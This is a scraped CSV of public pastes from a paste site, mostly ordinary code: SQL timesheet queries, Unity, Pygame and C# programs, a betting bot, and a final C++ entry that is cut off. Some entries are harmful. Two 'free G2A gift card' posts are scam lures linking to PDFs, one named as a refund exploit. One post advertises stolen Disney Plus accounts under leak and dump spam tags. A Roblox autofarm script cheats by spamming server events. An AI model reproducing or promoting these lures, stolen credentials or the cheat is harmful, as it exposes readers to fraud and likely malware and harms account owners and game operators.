id,title,username,language,date,content
9aYMRsac,lol,coinwalk,JavaScript,Tuesday 7th of May 2024 06:59:58 AM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = 144000
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
upper         = 6.9
downer        = 2.9
belance       = balance
resetstats()
 
function dobet()   
if win then
    belance = belance+previousbet
end
if !win then
    belance = belance-previousbet
end 
if (belance>(goodoldbal+(previousbet*upper))) then
    nextbet    = previousbet*2
    upper      = 4.9
    downer     = 4.9
    goodoldbal = belance
end    
if (belance<(goodoldbal-(previousbet*downer))) then
    nextbet    = previousbet*2
    upper      = 4.9
    downer     = 4.9
    goodoldbal = belance
end
if (((belance-(nextbet*40))<=(belance/40)) and (belance<(((math.floor(belance/tens))*tens)+sevens))) then
    nextbet    = betbse
    upper      = 6.9
    downer     = 2.9
    goodoldbal = ((math.floor(belance/tens))*tens)
end
if (((belance-(nextbet*40))<=(belance/40)) and (belance>(((math.floor(belance/tens))*tens)+sevens)) and (belance<(((math.floor(belance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    upper      = 4.9
    downer     = 4.9
    goodoldbal = belance
end
if (((belance-(nextbet*40))<=(belance/40)) and (belance>(((math.floor(belance/tens))*tens)+eights))) then
    nextbet    = betbse
    upper      = 6.9
    downer     = 2.9
    goodoldbal = ((math.floor(belance/tens))*tens)
end
if (((original-(nextbet*10))<=(original/10)) and (belance<(((math.floor(belance/tens))*tens)+sevens))) then
    nextbet    = betbse
    upper      = 6.9
    downer     = 2.9
    goodoldbal = ((math.floor(belance/tens))*tens)
end
if (((original-(nextbet*10))<=(original/10)) and (belance>(((math.floor(belance/tens))*tens)+sevens)) and (belance<(((math.floor(belance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    upper      = 4.9
    downer     = 4.9
    goodoldbal = belance
end
if (((original-(nextbet*10))<=(original/10)) and (belance>(((math.floor(belance/tens))*tens)+eights))) then
    nextbet    = betbse
    upper      = 6.9
    downer     = 2.9
    goodoldbal = ((math.floor(belance/tens))*tens)
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (belance<nextbet) then 
    stop()
end
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
YLRpsiV4,🤑 G2A.com Free Gift Card Guide May 2024 FIX 💰,ssss50w,GetText,Tuesday 7th of May 2024 06:59:43 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
07 May 2024	"
1sNL4UhT,Untitled,psi_mmobile,PL/SQL,Tuesday 7th of May 2024 06:56:05 AM CDT,"select mw.person_id, p.company_nr, mw.date_day, mw.sum_hrd timesheet_lines_hr, ptd.sum_hrd ptd_lines_hr 
from (select p.person_id,trunc(md.date_day) date_day, sum(mtsl.hrd) sum_hrd from mw_time_sheet_line mtsl, mfc_mobile_worker mmw, mw_day md, person p
where mtsl.mfc_mobile_worker_id = mmw.mfc_mobile_worker_id
    and mmw.erp_id = p.person_id
    and p.vo_person_category_id = 102503
    and mtsl.validation_status_id = 48
    and mtsl.mw_day_id = md.mw_day_id
    and trunc(md.date_day) >= to_date('01/02/2024','DD/MM/YYYY')
group by p.person_id, trunc(md.date_day)) mw,
(select ptd.person_id,trunc(ptd.date_day) date_day, sum(ptd.trf_dhr) sum_hrd from pd_trf_day ptd, person p
where ptd.person_id = p.person_id
    and p.vo_person_category_id = 102503
    and trunc(ptd.date_day) >= to_date('01/02/2024','DD/MM/YYYY')
group by ptd.person_id, trunc(ptd.date_day)) ptd,
person p
    where mw.sum_hrd > ptd.sum_hrd
    and mw.person_id = ptd.person_id
    and ptd.person_id = p.person_id
    and mw.date_day = ptd.date_day;"
Kk0SsRxa,myipms,Nil000,Email,Tuesday 7th of May 2024 06:36:56 AM CDT,"Myip.ms site accepts donations at this link:
https://shorturl.at/KRWZ0"
sZ89G6uB,Untitled,psi_mmobile,PL/SQL,Tuesday 7th of May 2024 06:30:53 AM CDT,"select mw.person_id, p.company_nr, mw.date_day, mw.sum_hrd timesheet_lines_hr, ptd.sum_hrd ptd_lines_hr from (select p.person_id,trunc(md.date_day) date_day, sum(mtsl.hrd) sum_hrd from mw_time_sheet_line mtsl, mfc_mobile_worker mmw, mw_day md, person p
where mtsl.mfc_mobile_worker_id = mmw.mfc_mobile_worker_id
and mmw.erp_id = p.person_id
and p.vo_person_category_id = 102503
and mtsl.validation_status_id = 48
and mtsl.mw_day_id = md.mw_day_id
and trunc(md.date_day) >= to_date('01/02/2024','DD/MM/YYYY')
group by p.person_id, trunc(md.date_day)) mw,
(select ptd.person_id,trunc(ptd.date_day) date_day, sum(ptd.trf_dhr) sum_hrd from pd_trf_day ptd, person p
where ptd.person_id = p.person_id
and p.vo_person_category_id = 102503
and trunc(ptd.date_day) >= to_date('01/02/2024','DD/MM/YYYY')
group by ptd.person_id, trunc(ptd.date_day)) ptd,
person p
where mw.sum_hrd > ptd.sum_hrd
and mw.person_id = ptd.person_id
and ptd.person_id = p.person_id
and mw.date_day = ptd.date_day;"
KsqEsWvV,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Tuesday 7th of May 2024 06:12:00 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_758555.pdf

Working as of:
07 May 2024"
8vvUNn1B,teleporter enable,fjahs3sfsffsdksdhg,JSON,Tuesday 7th of May 2024 06:08:01 AM CDT,"{
  ""l"": false,
  ""m"": ""loader""
}
"
X5myaipj,data919,TestGuy1,JSON,Tuesday 7th of May 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9a415671a7eb288114ce651fbe0319bc963ce903f73f39891f45b1f680df046222fa7e6558e6fda2b9738c933e80068d3f77c567efb510930c56c8021dfa2bc45f1736195726c6ea6ef243d9a1c6f129266a8531a136becb5f8f36b884c67c605ece712b089ce044edcee12456616e8772bd90def119699c10d69b27d03efb7c',
  otherdata: [
    'f2246a3ad548b8c9c10e1eef501cb0c2',
    '7c3569682068d8de518dcff6e6f58456',
    '536bbc358d819c9c53101dd27ced9d0e',
    '5b028eb22be91faa5029a4cfdf25e589',
    'd7c11ce50678f9cb72a57fcdd5673b2d',
    '66128c26b8e1d7dd67445326110bfdb7',
    'b0b814f87f12d202adaece918fcc1ca5',
    'c5d9affdd9dbc759e6ee7d1f3e0afa5d'
  ]
}"
JGVAAce1,CounterScript,RedBum,C#,Tuesday 7th of May 2024 05:37:20 AM CDT,"using System.Collections;
using UnityEngine;
using UnityEngine.UI;

public class CounterScript : MonoBehaviour
{
    [SerializeField] private Text counterText;
    private float counter = 0f;
    private bool isCounting = false;
    private Coroutine countCoroutine;

    void Update()
    {
        if (Input.GetMouseButtonDown(0))
        {
            isCounting = !isCounting;

            if (isCounting)
            {
                if (countCoroutine != null)
                    StopCoroutine(countCoroutine);

                countCoroutine = StartCoroutine(CountCoroutine());
            }

            else
            {
                if (countCoroutine != null)
                {
                    StopCoroutine(countCoroutine);
                }
            }
        }
    }

    IEnumerator CountCoroutine()
    {
        while (isCounting)
        {
            counter++;
            counterText.text = counter.ToString();
            yield return new WaitForSeconds(0.5f);
        }
    }
}"
4VCYLmap,Untitled,psi_mmobile,PL/SQL,Tuesday 7th of May 2024 05:25:48 AM CDT,"select p.person_id, w.wbs_id,w.name,trunc(md.date_day) date_day, p.company_nr, mtsl.hrd, mtsl.validation_status_id, x.sum_hrd from mw_time_sheet mts, mw_time_sheet_line mtsl, mfc_mobile_worker mmw, person p, fc_assignment fa, wbs w, mw_day md,
(select sum(m.hrd) sum_hrd,m.mfc_mobile_worker_id, trunc(md.date_day) date_Day from mw_time_sheet_line m, mw_day md group by m.mfc_mobile_worker_id, trunc(md.date_day)) x
where mts.mw_time_sheet_id = mtsl.mw_time_sheet_id
and mtsl.mfc_mobile_worker_id = mmw.mfc_mobile_worker_id
and mmw.mfc_mobile_worker_id = x.mfc_mobile_worker_id
and mmw.erp_id = p.person_id
and p.vo_person_category_id = 102503
and mtsl.mw_day_id = md.mw_day_id
and md.date_day = x.date_day
and x.date_day >= to_date('01/02/2024','DD/MM/YYYY')
and mtsl.validation_status_id = 48
and mtsl.fc_assignment_id = fa.fc_assignment_id
--and fa.erp_id = w.wbs_id
and x.sum_hrd > (select sum(trf_dhr) from pd_trf_day ptd
where trunc(ptd.date_day) = trunc(md.date_day) --join with mw day
and ptd.person_id = p.person_id
--and ptd.wbs_id = w.wbs_id
group by ptd.person_id,trunc(ptd.date_day))
order by 1,4;"
nFXgHL77,Pygame Linking Nodes,Windspar,Python,Tuesday 7th of May 2024 05:18:19 AM CDT,"import random
import pygame
from pygame.sprite import Group, Sprite

class Entity(Sprite):
    def __init__(self, image, position, anchor):
        super().__init__()
        self.image = image
        self.rect = image.get_rect(**{anchor: position})
        self.center = pygame.Vector2(self.rect.center)
        self.vector = pygame.Vector2()
        self._random()

    def _random(self):
        self.vector.from_polar((1, random.randint(0, 360)))
        self.velocity = random.randrange(60, 180)

    def update(self, delta, area):
        self.center += self.vector * delta * self.velocity
        self.rect.center = self.center
        clamp = self.rect.clamp(area)

        # Boundry Collision
        if clamp != self.rect:
            if clamp.x != self.rect.x:
                self.vector.x = -self.vector.x

            if clamp.y != self.rect.y:
                self.vector.y = -self.vector.y

            self.rect = clamp
            self.center = pygame.Vector2(self.rect.center)

class Scene:
    def __init__(self, display):
        self.display = display

    def on_draw(self, surface):
        pass

    def on_event(self, event):
        pass

    def on_update(self, delta):
        pass

class Display:
    def __init__(self, caption, width, height, flags=0, fps=60):
        pygame.display.set_caption(caption)
        self.display = pygame.display.set_mode((width, height), flags)
        self.rect = self.display.get_rect()
        self.clock = pygame.time.Clock()
        self.running = True
        self.delta = 0
        self.fps = fps

        self.scene = Scene(self)

    def loop(self):
        while self.running:
            for event in pygame.event.get():
                self.scene.on_event(event)

            self.scene.on_update(self.delta)
            self.scene.on_draw(self.display)
            pygame.display.flip()
            # Using delta time for smooth movement.
            self.delta = self.clock.tick(self.fps) / 1000

class ImageHandler:
    def __init__(self):
        self.radius = 10
        self.nodes = self.create_nodes()

    def create_nodes(self):
        colors = self.get_colors()
        nodes = []
        transparent = 0, 0, 0, 0
        size = self.radius * 2, self.radius * 2
        surface = pygame.Surface(size, pygame.SRCALPHA)
        surface.fill(transparent)
        for color in colors:
            pygame.draw.circle(surface, color, (self.radius, self.radius), self.radius)
            nodes.append(surface.copy())

        return nodes

    def get_colors(self):
        dark = 80
        colors = []
        for color in pygame.color.THECOLORS:
            pcolor = pygame.Color(color)
            if pcolor.a > dark and pcolor.g > dark and pcolor.b > dark:
                if not color.startswith('grey') and not color.startswith('gray'):
                    colors.append(color)

        random.shuffle(colors)
        return colors

class Main(Scene):
    def __init__(self, display):
        super().__init__(display)
        self.image = ImageHandler()
        self.nodes = Group()

        self.setup(20)

    def setup(self, count):
        count = min(count, len(self.image.nodes))
        self.nodes.empty()
        rad = self.image.radius * 2
        for i in range(count):
            position = (random.randint(rad, self.display.rect.w - rad),
                        random.randint(rad, self.display.rect.h - rad))

            self.nodes.add(Entity(self.image.nodes[i], position, 'center'))

    def draw_lines(self, surface):
        rnd = random.randrange
        for i, inode in enumerate(self.nodes):
            nearest = None
            min_dist = float('inf')
            for j, jnode in enumerate(self.nodes):
                if i != j:
                    dist = inode.center.distance_to(jnode.center)
                    if dist < min_dist:
                        min_dist = dist
                        nearest = jnode

            line_color = pygame.Color(rnd(0, 255), rnd(0, 255), rnd(0, 255), 255)
            if min_dist <= 255:
                line_color.a = int(255 - min_dist)

            if min_dist <= 1000:
                pygame.draw.line(surface, line_color, inode.rect.center, nearest.rect.center)

    def on_draw(self, surface):
        surface.fill('black')
        # Draw all lines first
        self.draw_lines(surface)
        # Draw all circles
        self.nodes.draw(surface)

    def on_event(self, event):
        if event.type == pygame.QUIT:
            self.display.running = False

    def on_update(self, delta):
        self.nodes.update(delta, self.display.rect)

def main():
    pygame.init()
    display = Display(""Example"", 800, 600)
    main = Main(display)
    display.scene = main
    display.loop()
    pygame.quit()

main()
"
SYH9rPBb,Delete the Middle Node of a Linked List,jayati,C++,Tuesday 7th of May 2024 05:13:14 AM CDT,"/**
 * Definition for singly-linked list.
 * struct ListNode {
 *     int val;
 *     ListNode *next;
 *     ListNode() : val(0), next(nullptr) {}
 *     ListNode(int x) : val(x), next(nullptr) {}
 *     ListNode(int x, ListNode *next) : val(x), next(next) {}
 * };
 */
class Solution {
public:
    ListNode* deleteMiddle(ListNode* head) {
        if(head->next==NULL)
        {
            return NULL;
        }
        ListNode* temp = head;
        int l=0;
        while(temp->next!=NULL)
        {
            l++;
            temp=temp->next;
        }
        // if(l%2==1)
        // {
        //    l=l/2;
        // }
        // else
        // {
        //     l=(l/2)+1;
        // }
        int i=0;
        ListNode* prev=NULL;
        ListNode* curr=head;
        while(i<((l+1)/2))
        {
            prev=curr;
             curr=curr->next;
            i++;
        }
        // ListNode* curr=prev->next;
        prev->next=curr->next;
        curr->next=NULL;
        delete(curr);
        return head;
        
    }
};"
NKv9ZFWu,AVSKS,khuseiN,C#,Tuesday 7th of May 2024 04:30:28 AM CDT,"using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.IO;
using System.Collections.Generic;

namespace server
{
    class Program
    {
        static TcpListener listener = null;
        static Dictionary<string, string> credentials;
        static Dictionary<string, TcpClient> clients = new Dictionary<string, TcpClient>();
        static Dictionary<string, TcpClient> authclients = new Dictionary<string, TcpClient>();

        static void Main(string[] args)
        {
            string filePath = ""clients.txt"";
            credentials = ReadCredentialsFromFile(filePath);

            listener = new TcpListener(IPAddress.Any, 8000);
            listener.Start();
            Console.WriteLine(""Сервер запущен. Ожидание подключений..."");

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Thread clientThread = new Thread(() => HandleClient(client));
                clientThread.Start();
            }
        }

        static Dictionary<string, string> ReadCredentialsFromFile(string filePath)
        {
            Dictionary<string, string> credentials = new Dictionary<string, string>();
            try
            {
                string[] lines = File.ReadAllLines(filePath);
                foreach (string line in lines)
                {
                    string[] tokens = line.Split(' ');
                    if (tokens.Length == 2)
                    {
                        string username = tokens[0];
                        string password = tokens[1];
                        credentials[username] = password;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($""Ошибка при чтении файла: {ex.Message}"");
            }
            return credentials;
        }

        static void HandleClient(TcpClient client)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[1024];
            int bytesRead;

            bool isAuthenticated = false;

            while (true)
            {
                bytesRead = 0;
                try
                {
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                }
                catch
                {
                    break;
                }
                if (bytesRead == 0)
                {
                    break;
                }

                string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                if (!isAuthenticated && message.StartsWith(""AUTH""))
                {
                    string[] authData = message.Split(' ');
                    if (authData.Length == 3)
                    {
                        string username = authData[1];
                        string password = authData[2];
                        if (credentials.ContainsKey(username) && credentials[username] == password)
                        {
                            if (authclients.ContainsKey(username))
                            {
                                SendMessage(client, ""Ошибка: клиент с даннымм логином уже подключен"");
                                Console.WriteLine($""{username} уже подключен"");
                                client.Close();
                            }
                            else
                            {
                                authclients[username] = client;
                                clients[username] = client;
                                SendMessage(client, ""AUTH_SUCCES"");
                                Console.WriteLine($""{username} успешно аутентифицирован"");
                                isAuthenticated = true;
                            }
                        }
                        else
                        {
                            SendMessage(client, $""Ошибка аутентификации {username}"");
                            Console.WriteLine($""{username} ошибка аутентификации"");
                            client.Close();
                        }
                    }
                }

                Console.WriteLine($""Получено сообщение от клиента {message}"");
                foreach (var kvp in authclients)
                {
                    if (kvp.Value != client && kvp.Value.Connected)
                    {
                        if (!message.StartsWith(""AUTH""))
                        {
                            SendMessage(kvp.Value, message);
                        }
                    }
                }
            }
            Console.WriteLine(""Клиент отключился"");
            client.Close();
        }

        static void SendMessage(TcpClient client, string message)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = Encoding.UTF8.GetBytes(message);
            stream.Write(buffer, 0, buffer.Length);
        }
    }
}
"
zBGG2qPD,Untitled,Rodunskiy,C#,Tuesday 7th of May 2024 04:25:39 AM CDT,"using System;
 
namespace CSLight
{
    public class Program
    {
        static void Main(string[] args)
        {
            const string ChangeUsdtoRubCommand = ""1"";
            const string ChangeUsdtoEurCommand = ""2"";
            const string ChangeRubtoEurCommand = ""3"";
            const string ChangeRubtoUsdCommand = ""4"";
            const string ChangeEurtoUsdCommand = ""5"";
            const string ChangeEurtoRubCommand = ""6"";
            const string ExitProgramCommand = ""7"";

            int balanceUsd = 10;
            int balanceRub = 1000;
            int balanceEur = 10;

            int exchangeRateUsdtoRub = 90;
            int exchangeRateUsdtoEur = 1;
            int exchangeRateEurtoRub = 80;
            int exchangeRateEurtoUsd = 1;
            int exchangeRateRubtoUsd = 100;
            int exchangeRateRubtoEur = 90;

            int translationUsd;
            int translationRub;
            int translationEur;

            bool canWork = true;

            while(canWork) 
            {
                Console.Clear();
                Console.WriteLine($""Баланс ваших кошельков:\n"" +
                    $""Usd:{balanceUsd}\n"" +
                    $""Rub:{balanceRub}\n"" +
                    $""Eur:{balanceEur}\n"" +
                    $""Какую валюту вы хотели бы обменять?\n"" +
                    $""{ChangeUsdtoRubCommand})Поменять usd на rub.\n"" +
                    $""{ChangeUsdtoEurCommand})Поменять usd на eur.\n"" +
                    $""{ChangeRubtoEurCommand})Поменять rub на eur.\n"" +
                    $""{ChangeRubtoUsdCommand})Поменять rub на usd\n{ChangeEurtoUsdCommand})Поменять eur на usd\n"" +
                    $""{ChangeEurtoRubCommand})Поменять eur на rub\n{ExitProgramCommand})Выйти из банка."");

                switch (Console.ReadLine())
                {
                    case ChangeUsdtoRubCommand:
                        Console.WriteLine(""Сколько usd вы хотите обменять на rub?"");
                        translationUsd = Convert.ToInt32(Console.ReadLine());

                        if(translationUsd <= balanceUsd) 
                        {
                            balanceUsd -= translationUsd;
                            balanceRub += translationUsd * exchangeRateUsdtoRub;
                        }
                        else
                        {
                            Console.WriteLine(""У вас недостаточно usd для обмена!"");
                            Console.ReadKey();
                        }
                        break;

                    case ChangeUsdtoEurCommand:
                        Console.WriteLine(""Сколько usd вы хотите обменять на eur?"");
                        translationUsd = Convert.ToInt32(Console.ReadLine());

                        if (translationUsd <= balanceUsd)
                        {
                            balanceUsd -= translationUsd;
                            balanceEur += translationUsd * exchangeRateUsdtoEur;
                        }
                        else
                        {
                            Console.WriteLine(""У вас недостаточно usd для обмена!"");
                            Console.ReadKey();
                        }
                        break;

                    case ChangeRubtoEurCommand:
                        Console.WriteLine(""Сколько rub вы хотите обменять на eur?"");
                        translationRub = Convert.ToInt32(Console.ReadLine());

                        if (translationRub <= balanceRub)
                        {
                            balanceRub -= translationRub;
                            balanceEur += translationRub / exchangeRateRubtoEur;
                        }
                        else
                        {
                            Console.WriteLine(""У вас недостаточно rub для обмена!"");
                            Console.ReadKey();
                        }
                        break;

                    case ChangeRubtoUsdCommand:
                        Console.WriteLine(""Сколько rub вы хотите обменять на usd?"");
                        translationRub = Convert.ToInt32(Console.ReadLine());

                        if (translationRub <= balanceRub)
                        {
                            balanceRub -= translationRub;
                            balanceUsd += translationRub / exchangeRateRubtoUsd;
                        }
                        else
                        {
                            Console.WriteLine(""У вас недостаточно rub для обмена!"");
                            Console.ReadKey();
                        }
                        break;

                    case ChangeEurtoUsdCommand:
                        Console.WriteLine(""Сколько eur вы хотите обменять на usd?"");
                        translationEur = Convert.ToInt32(Console.ReadLine());

                        if (translationEur <= balanceEur)
                        {
                            balanceEur -= translationEur;
                            balanceUsd += translationEur * exchangeRateEurtoUsd;
                        }
                        else
                        {
                            Console.WriteLine(""У вас недостаточно eur для обмена!"");
                            Console.ReadKey();
                        }
                        break;

                    case ChangeEurtoRubCommand:
                        Console.WriteLine(""Сколько eur вы хотите обменять на rub?"");
                        translationEur = Convert.ToInt32(Console.ReadLine());

                        if (translationEur <= balanceEur)
                        {
                            balanceEur -= translationEur;
                            balanceRub += translationEur * exchangeRateEurtoRub;
                        }
                        else
                        {
                            Console.WriteLine(""У вас недостаточно eur для обмена!"");
                            Console.ReadKey();
                        }
                        break;

                    case ExitProgramCommand:
                        canWork = false;
                        break;
                }
            }      
        }
    }
}"
0Z9kT9X8,5X DISNEY PLUS YEARLY,cracknplay,GetText,Tuesday 7th of May 2024 03:52:32 AM CDT,"5X DISNEY PLUS ACCOUNTS!!!!
FRESHLY CHECKED, WORKING AT 5/7/2024
FULL CAPTURE, YEARLY PLAN!
 
https://upfiles.com/eNV0Cn8R
https://upfiles.com/eNV0Cn8R
https://upfiles.com/eNV0Cn8R
 
 
 
 
Tags:
free robux,free fortnite account,how to get free robux,buying fortnite accounts,free fire account ban,free robux live,my free fire account has banned!,dhanu dino free fire account ban,fortnite account,rare fortnite account,how to buy fortnite accounts,then giving the account away for free,free,buying rare fortnite account,buying rare account fortnite,buying fortnite account,buying a fortnite account,roblox robux free,create account, free pastebin, free disney, free disney plus, free accounts, free 2024, pasted accounts, db leak, free telegram, pastebin, pastebin leaks, free netflix, free hbo, db leak 2024, dumps"
zjnM9PKH,HA unavailable devices,chemelli74,Python,Tuesday 7th of May 2024 03:29:46 AM CDT,"type: markdown
content: >-
  {%- set list_exclude = ['media_player.bravia_kdl_46hx855',
  'media_player.tv_samsung_tv_q85_series_55'] -%}

  {%- set devices = namespace(id=[]) -%}

  {%- for item in states -%}
    {%- if item.entity_id not in list_exclude and
           item.state == 'unavailable' and 
           not ( item.entity_id.startswith('switch.') and item.entity_id.endswith('_shuffle_switch')) and
           not ( item.entity_id.startswith('switch.') and item.entity_id.endswith('_repeat_switch'))
     -%}      
        {%- set devices.id = devices.id + [device_id(item.entity_id)] -%}
    {%- endif -%}
  {%- endfor -%}

  {%- for device in devices.id | unique -%}
    - {{ device_attr(device, 'name' ) + ""\n""}}
  {%- endfor -%}
title: Device non disponibili
"
eAJGGSEd,Legends Of Speed | AutoFarm,Marty2000,Lua,Tuesday 7th of May 2024 03:25:51 AM CDT,"local uwu = Instance.new(""ScreenGui"")
local Main = Instance.new(""Frame"")
local cre = Instance.new(""TextLabel"")
local step = Instance.new(""TextButton"")
local gems = Instance.new(""TextButton"")
local out = Instance.new(""TextButton"")

uwu.Name = ""uwu""
uwu.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
uwu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
uwu.ResetOnSpawn = false

Main.Name = ""Main""
Main.Parent = uwu
Main.BackgroundColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Main.Position = UDim2.new(0.604411781, 0, 0.214574918, 0)
Main.Size = UDim2.new(0, 193, 0, 148)
Main.Selectable = true
Main.Active = true
Main.Draggable = true

cre.Name = ""cre""
cre.Parent = Main
cre.BackgroundColor3 = Color3.new(0, 0, 0)
cre.BackgroundTransparency = 1
cre.Position = UDim2.new(-0.00310030137, 0, 0.81, 0)
cre.Size = UDim2.new(0, 193, 0, 19)
cre.Font = Enum.Font.SourceSans
cre.Text = ""By Memedog#8352\n(Edited by: adsciy_pidoras)""
cre.TextColor3 = Color3.new(1, 1, 1)
cre.TextSize = 18

local stepped = false

step.Name = ""step""
step.Parent = Main
step.BackgroundColor3 = Color3.new(1, 1, 1)
step.Position = UDim2.new(0.1938546, 0, 0.19810304, 0)
step.Size = UDim2.new(0, 117, 0, 25)
step.Font = Enum.Font.SourceSans
step.Text = ""Steps Farm [OFF]""
step.TextColor3 = Color3.new(0, 0, 0)
step.TextSize = 18
step.MouseButton1Click:connect(function()
    stepped = not stepped
    while wait() do
        if stepped == true then
            step.Text = ""Steps Farm [ON]""
            for i = 1, 500 do
                game:GetService(""ReplicatedStorage"").rEvents.orbEvent:FireServer(""collectOrb"", ""Orange Orb"", ""City"")
                game:GetService(""ReplicatedStorage"").rEvents.orbEvent:FireServer(""collectOrb"", ""Red Orb"", ""City"")
                game:GetService(""ReplicatedStorage"").rEvents.orbEvent:FireServer(""collectOrb"", ""Blue Orb"", ""City"")
            end
            wait(1.5)
        else
            step.Text = ""Steps Farm [OFF]""
            break
        end
    end
end)

gems.Name = ""gems""
gems.Parent = Main
gems.BackgroundColor3 = Color3.new(1, 1, 1)
gems.Position = UDim2.new(0.188673258, 0, 0.515670598, 0)
gems.Size = UDim2.new(0, 117, 0, 25)
gems.Font = Enum.Font.SourceSans
gems.Text = ""Gems Farm""
gems.TextColor3 = Color3.new(0, 0, 0)
gems.TextSize = 18
gems.MouseButton1Click:connect(function()
	for i=1, 1000 do
     local A_1 = ""collectOrb""
local A_2 = ""Gem""
local A_3 = ""City""
local Event = game:GetService(""ReplicatedStorage"").rEvents.orbEvent
Event:FireServer(A_1, A_2, A_3)
end
end)

out.Name = ""out""
out.Parent = Main
out.BackgroundColor3 = Color3.new(1, 1, 1)
out.BackgroundTransparency = 1
out.Position = UDim2.new(0.917098463, 0, 0, 0)
out.Size = UDim2.new(0, 16, 0, 18)
out.Font = Enum.Font.SourceSans
out.Text = ""X""
out.TextColor3 = Color3.new(1, 0, 0)
out.TextSize = 20
out.MouseButton1Click:connect(function()
	Main.Visible = false
end)"
FaQrAXcp,"jak co je funkcni 1,2,3,4, ci 1,2,3,0",max2201111,Python,Tuesday 7th of May 2024 03:20:32 AM CDT,"endGame54
def evaluate_board(board, depth):
    if board.is_checkmate():
        return -1000 + depth if board.turn == chess.WHITE else 1000 - depth
    elif board.is_stalemate():
        return 2210
    elif board.is_insufficient_material():
        return 3400
    elif ten_moves_rule(board):
        return 9800
    return 7001  # funkcni Default return if none of the above conditions are met

endGame59
def evaluate_board(board, depth):
    if board.is_checkmate():
        return -1000 + depth if board.turn == chess.WHITE else 1000 - depth
    elif board.is_stalemate():
        return 0
    elif board.is_insufficient_material():
        return 0
    elif ten_moves_rule(board):
        return 0
    return 0  # spatne Default return if none of the above conditions are met

endgame58
def evaluate_board(board, depth):
    if board.is_checkmate():
        return -1000 + depth if board.turn == chess.WHITE else 1000 - depth
    elif board.is_stalemate():
        return 1
    elif board.is_insufficient_material():
        return 2
    elif ten_moves_rule(board):
        return 3
    return 0  # spatne Default return if none of the above conditions are met


endGame55
def evaluate_board(board, depth):
    if board.is_checkmate():
        return -1000 + depth if board.turn == chess.WHITE else 1000 - depth
    elif board.is_stalemate():
        return 1
    elif board.is_insufficient_material():
        return 2
    elif ten_moves_rule(board):
        return 3
    return 4  # funkcni spatne s return 0001 Default return if none of the above conditions are met
"
dwsDTTQP,Untitled,npman,JSON,Tuesday 7th of May 2024 03:19:41 AM CDT,"{
  ""code"": 200,
  ""status"": ""success"",
  ""data"": {
    ""header_block"": {
      ""name"": ""Воздушный персик: вина в цвете года Pantone"",
      ""date"": ""21.03.2024"",
      ""image"": ""/upload/iblock/884/884f944ddebedb779be1ca583235d896.jpg"",
      ""link"": ""https://simplewine.ru/articles/podborki/vina-v-tsvete-goda-pantone/""
    },
    ""content"": [
      {
        ""html"": ""<html>Основное содержание статьи</html>"",
        ""products"": [
          {
            ""bitrix_id"": 216931,
            ""name"": ""Gavi Il Valentino"",
            ""article"": ""142915"",
            ""manufacturer"": ""La Scolca"",
            ""image"": ""/upload/iblock/691/69138d2a06966724af84dc10172603d5.jpg"",
            ""price"": 1953,
            ""old_price"": 2790,
            ""available"": true,
            ""reserved"": true,
            ""pack"": 1,
            ""diff"": 30,
            ""year"": 2022,
            ""volume"": 0.75,
            ""color"": ""белое"",
            ""ratings"": [
              {
                ""value"": 4.5,
                ""type"": ""rating_simplewine""
              }
            ],
            ""vote_count"": 110,
            ""set"": false,
            ""section_root"": ""vino"",
            ""more_photo"": [
              ""/upload/iblock/222/22252d6c1d3b02826a0f8c5b7c62629c.png"",
              ""/upload/iblock/09f/09fca2221a4c34aa23041c7a36f45050.jpg""
            ],
            ""available_quantity"": 300,
            ""taste_characteristics"": [
              {
                ""name"": ""Сладость"",
                ""value"": 1,
                ""code"": ""sweetness""
              },
              {
                ""name"": ""Кислотность"",
                ""value"": 5,
                ""code"": ""acidity""
              },
              {
                ""name"": ""Ароматичность"",
                ""value"": 3,
                ""code"": ""tanins""
              },
              {
                ""name"": ""Тело"",
                ""value"": 3,
                ""code"": ""bodied""
              }
            ],
            ""is_non_alcoholic"": false,
            ""button_buy_text"": ""В корзину"",
            ""floating_discount"": false,
            ""volume_outsize"": false,
            ""sales"": [
              {
                ""promo_id"": 1262,
                ""sort"": 500,
                ""name"": ""Дарите то, что хочется открыть!""
              }
            ],
            ""spec_price"": false,
            ""fine_rare"": false,
            ""sugar_type"": ""сухое"",
            ""is_customer_choice"": false,
            ""country_name"": ""Италия""
          }
        ]
      }
    ]
  }
}"
sBZ4XL0h,ExileServer_system_network_event_onPlayerConnected,Irkutsk86,C++,Tuesday 7th of May 2024 03:10:35 AM CDT,"/**
 * ExileServer_system_network_event_onPlayerConnected
 *
 * Exile Mod
 * www.exilemod.com
 * © 2015 Exile Mod Team
 *
 * This work is licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License. 
